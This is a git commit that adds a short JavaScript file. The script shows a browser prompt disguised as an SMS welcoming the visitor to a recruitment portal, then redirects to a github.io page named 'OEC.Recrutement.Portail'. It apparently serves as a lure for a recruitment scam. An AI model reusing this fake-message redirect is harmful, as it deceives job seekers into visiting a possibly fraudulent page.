c0876e2972797bd0c9126892287f9e91527f3fca
allregnws <promisebassey8081@gmail.com>
2025-04-22 12:23:16 +0100

    Create oc.js

---
+++ oc.js
@@ -0,0 +1,5 @@
+var password = 'OEC'
+password=prompt('SMS :Bienvenue sur notre portail de recrutement, cliquez sur OK pour démarrer la candidature  ','OEC');
+if (password != 'OEC') {
+location.href='https://allregnws.github.io/OEC.Recrutement.Portail';
+}
